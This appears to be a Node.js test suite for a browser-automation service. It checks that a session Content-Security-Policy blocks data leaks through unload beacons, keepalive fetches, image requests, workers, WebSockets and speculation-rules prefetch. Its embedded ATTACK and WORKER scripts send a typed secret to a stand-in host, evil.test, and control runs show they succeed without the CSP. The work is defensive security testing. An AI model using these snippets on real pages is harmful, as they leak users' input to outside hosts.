// The channels NO network hook can see (second independent review: H1-H3, M1): requests sent while a page unloads, SharedWorker / Worker
// (and the WebSocket / fetch they make), inline speculation rules. They are closed by the Content-Security-Policy the worker adds to every
// document of an interactive session, which the BROWSER enforces. Each scenario also runs WITHOUT the CSP as a control, so the suite proves
// the channels are real (they deliver) and that the CSP - not luck - is what stops them.
import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import https from "node:https";
import { execFileSync } from "node:child_process";
import { chromium } from "playwright-core";
import { startMock, MOCK_KEY } from "../../../poc/smoke1/mock-browserbase.mjs";
import { createClient } from "../../../poc/smoke1/browserbase.mjs";
import { createApp } from "../app.mjs";
import { createPolicy } from "../policy.mjs";
import { LIMITS } from "../actions.mjs";
import { SESSION_CSP } from "../browse.mjs";

const TOKEN = "k".repeat(40);
const haveChromium = fs.existsSync(chromium.executablePath());
if (!haveChromium && process.env.REQUIRE_BROWSER === "1") throw new Error("REQUIRE_BROWSER=1 but Chromium is not installed");
const tick = (ms = 20) => new Promise((r) => setTimeout(r, ms));
const LAB = "https://lab.test/browser-lab/";

// everything a hostile page can try at load / unload / visibility change that is invisible to route() and CDP Fetch
const ATTACK = `
const D = (f) => { try { f(); } catch (e) {} };
const out = (tag) => "/browser-lab/api/" + tag + "?d=typed-secret";
const send = () => {
  D(() => navigator.sendBeacon("https://evil.test/BEACON-evil", "typed-secret"));
  D(() => navigator.sendBeacon(out("BEACON-lab"), "x"));
  D(() => fetch("https://evil.test/KEEPALIVE-evil", { method: "POST", keepalive: true, mode: "no-cors", body: "typed-secret" }).catch(() => {}));
  D(() => fetch(out("KEEPALIVE-lab"), { method: "POST", keepalive: true, body: "amount=1000" }).catch(() => {}));
  D(() => { new Image().src = "https://evil.test/IMG-evil?d=typed-secret"; });
  D(() => { new Image().src = out("IMG-lab"); });
};
addEventListener("pagehide", send); addEventListener("visibilitychange", send);
D(() => new SharedWorker("/browser-lab/w.js"));
D(() => new Worker("/browser-lab/w.js"));
D(() => new Worker(URL.createObjectURL(new Blob(['new WebSocket("wss://evil.test/WS-blobworker")']))));
D(() => { const s = document.createElement("script"); s.type = "speculationrules"; s.textContent = JSON.stringify({ prefetch: [{ source: "list", urls: ["https://evil.test/SPEC-dynamic?d=1", "/browser-lab/api/SPEC-lab?d=1"] }] }); document.head.appendChild(s); });
`;
const WORKER = `try { new WebSocket("wss://evil.test/WS-fileworker"); } catch (e) {} fetch("https://evil.test/FETCH-worker", { method: "POST", mode: "no-cors", body: "x" }).catch(() => {}); fetch("/browser-lab/api/FETCH-worker-lab", { method: "POST", body: "x" }).catch(() => {});`;
const html = (body) => `<!doctype html><html><meta charset="utf-8"><title>csp</title><body>${body}</body></html>`;
const PAGES = {
  "/browser-lab/csp-ext.html": html(`<a href="/browser-lab/page2.html">Next page</a><script src="/browser-lab/hostile.js"></script>`),
  "/browser-lab/csp-inline.html": html(`<a href="/browser-lab/page2.html">Next page</a><p id="o">inline-not-run</p><script>${ATTACK}\ndocument.getElementById("o").textContent = "inline-RAN";</script><script type="speculationrules">{"prefetch":[{"source":"list","urls":["/browser-lab/api/SPEC-static?d=1","https://evil.test/SPEC-static-evil?d=1"]}]}</script>`),
  "/browser-lab/csp-404.html": html(`<a href="/browser-lab/page2.html">Next page</a><script src="/browser-lab/hostile.js"></script>`),
  "/browser-lab/page2.html": html(`<h1>Second page</h1>`),
};

test("channels invisible to network hooks are closed by the session CSP", { skip: !haveChromium && "Chromium not installed", timeout: 300_000 }, async (t) => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "browser-csp-"));
  execFileSync("openssl", ["req", "-x509", "-newkey", "rsa:2048", "-nodes", "-keyout", path.join(dir, "k.pem"), "-out", path.join(dir, "c.pem"),
    "-days", "1", "-subj", "/CN=lab.test", "-addext", "subjectAltName=DNS:evil.test,DNS:lab.test"], { stdio: "ignore" });
  let hits = [];
  const site = https.createServer({ key: fs.readFileSync(path.join(dir, "k.pem")), cert: fs.readFileSync(path.join(dir, "c.pem")) }, (req, res) => {
    const host = (req.headers.host ?? "").split(":")[0];
    hits.push(`${req.method} ${host}${req.url}`);
    if (req.url === "/browser-lab/hostile.js") { res.writeHead(200, { "content-type": "text/javascript" }); return res.end(ATTACK); }
    if (req.url === "/browser-lab/w.js") { res.writeHead(200, { "content-type": "text/javascript" }); return res.end(WORKER); }
    if (req.url.startsWith("/browser-lab/api/")) { res.writeHead(200, { "content-type": "text/plain" }); return res.end("ok"); }
    const page = host === "lab.test" ? PAGES[req.url.split("?")[0]] : null;
    if (!page) { res.writeHead(404); return res.end("no"); }
    res.writeHead(req.url.startsWith("/browser-lab/csp-404") ? 404 : 200, { "content-type": "text/html; charset=utf-8" }); res.end(page);
  });
  site.on("upgrade", (req, socket) => { hits.push(`WS-UPGRADE ${(req.headers.host ?? "").split(":")[0]}${req.url}`); socket.destroy(); });
  await new Promise((r) => site.listen(0, "127.0.0.1", r));
  const port = site.address().port;
  const noProxyEnv = Object.fromEntries(Object.entries(process.env).filter(([k]) => !/proxy/i.test(k)));
  const mock = await startMock({ chromium, launchOptions: { env: noProxyEnv, args: [`--host-resolver-rules=MAP lab.test 127.0.0.1:${port}, MAP evil.test 127.0.0.1:${port}`, "--ignore-certificate-errors"] } });
  const limits = { ...LIMITS, idleMs: 60_000 };
  const mk = async (sessionCsp) => {
    const { server, manager } = createApp({ token: TOKEN, policy: createPolicy(["example.com"], ["lab.test/browser-lab/"]), projectId: "p", log: () => {}, limits, sessionCsp, client: createClient({ apiKey: MOCK_KEY, base: mock.base }) });
    await new Promise((r) => server.listen(0, "127.0.0.1", r));
    return { server, manager, base: `http://127.0.0.1:${server.address().port}` };
  };
  const on = await mk(undefined), off = await mk(null);
  t.after(async () => { for (const a of [on, off]) { await a.manager.shutdown(); a.server.closeAllConnections(); await new Promise((r) => a.server.close(r)); } await mock.stop(); site.closeAllConnections(); await new Promise((r) => site.close(r)); fs.rmSync(dir, { recursive: true, force: true }); });

  /** loads `page`, types a secret, clicks the allowed link (the page unloads), waits, returns every request that is NOT an ordinary page/script load */
  const attack = async (app, page) => {
    hits = [];
    const call = (m, p, b) => fetch(app.base + p, { method: m, headers: { authorization: "Bearer " + TOKEN, ...(b ? { "content-type": "application/json" } : {}) }, body: b ? JSON.stringify(b) : undefined });
    const r = await call("POST", "/v1/jobs", { url: LAB + page, mode: "interactive" });
    const id = (await r.json()).job.id;
    const get = async () => (await (await call("GET", `/v1/jobs/${id}`)).json()).job;
    for (let i = 0; i < 200 && !(await get()).ready; i++) await tick(50);
    await tick(700);
    await call("POST", `/v1/jobs/${id}/actions`, { tool: "click", target: { by: "role", role: "link", value: "Next page" } });
    for (let i = 0; i < 200; i++) { const v = await get(); if (v.actions[0] && ["done", "denied", "failed"].includes(v.actions[0].status)) break; await tick(50); }
    await tick(1500);
    const view = await get();
    await call("POST", `/v1/jobs/${id}/finish`);
    for (let i = 0; i < 200 && !["succeeded", "failed", "cancelled"].includes((await get()).status); i++) await tick(50);
    return { bad: hits.filter((h) => !/ \S*\/browser-lab\/(csp-ext|csp-inline|csp-404|page2)\.html$|hostile\.js$|w\.js$/.test(h) || /^POST/.test(h)), view };
  };

  await t.test("the CSP itself: no inline script, no connect, no workers, no frames, no image/font network, same-origin forms only", () => {
    for (const d of ["default-src 'none'", "script-src 'self'", "connect-src 'none'", "worker-src 'none'", "child-src 'none'", "frame-src 'none'", "object-src 'none'", "img-src data:", "form-action 'self'", "base-uri 'none'", "frame-ancestors 'none'"]) assert.ok(SESSION_CSP.includes(d), d);
    assert.equal(/unsafe-inline'?(?=[^;]*)/.test(SESSION_CSP.split("; ").find((x) => x.startsWith("script-src"))), false, "script-src never grants unsafe-inline (that is what keeps inline speculation rules out)");
  });

  await t.test("CONTROL (no CSP): the unload / worker / speculation channels really do deliver data to evil.test and unapproved POSTs to the lab", async () => {
    const { bad } = await attack(off, "csp-ext.html");
    const joined = bad.join("\n");
    for (const needle of ["BEACON-evil", "KEEPALIVE-evil", "IMG-evil", "WS-blobworker", "FETCH-worker", "SPEC-dynamic"]) assert.match(joined, new RegExp(needle), `control: ${needle} should arrive without the CSP\n${joined}`);
    assert.match(joined, /POST lab\.test\/browser-lab\/api\/KEEPALIVE-lab/);
  });

  await t.test("WITH the CSP: nothing of that arrives (same page, same attacks); the page's own allowed navigation still works", async () => {
    const { bad, view } = await attack(on, "csp-ext.html");
    assert.deepEqual(bad, [], `no unload beacon/keepalive/image, no worker traffic, no speculation: ${bad.join(" | ")}`);
    assert.equal(view.actions[0].status, "done", "the allowed link click itself is unaffected");
  });

  await t.test("an ERROR page (HTTP 404) that carries the attack scripts gets the CSP too", async () => {
    const { bad } = await attack(on, "csp-404.html");
    assert.deepEqual(bad, [], bad.join(" | "));
    const ctl = await attack(off, "csp-404.html");
    assert.match(ctl.bad.join("\n"), /BEACON-evil/, "control: the same 404 page DOES deliver without the CSP");
  });

  await t.test("WITH the CSP an INLINE page script never runs at all (and inline speculation rules stay out)", async () => {
    const { bad, view } = await attack(on, "csp-inline.html");
    assert.deepEqual(bad, [], bad.join(" | "));
    assert.match(view.result.excerpt, /Second page|inline-not-run/);
    assert.doesNotMatch(view.result.excerpt, /inline-RAN/);
  });

  await t.test("CONTROL for inline: without the CSP the inline script runs and the speculation rules fire", async () => {
    const { bad } = await attack(off, "csp-inline.html");
    assert.match(bad.join("\n"), /SPEC-static|SPEC-dynamic|BEACON-evil/, bad.join(" | "));
  });
});
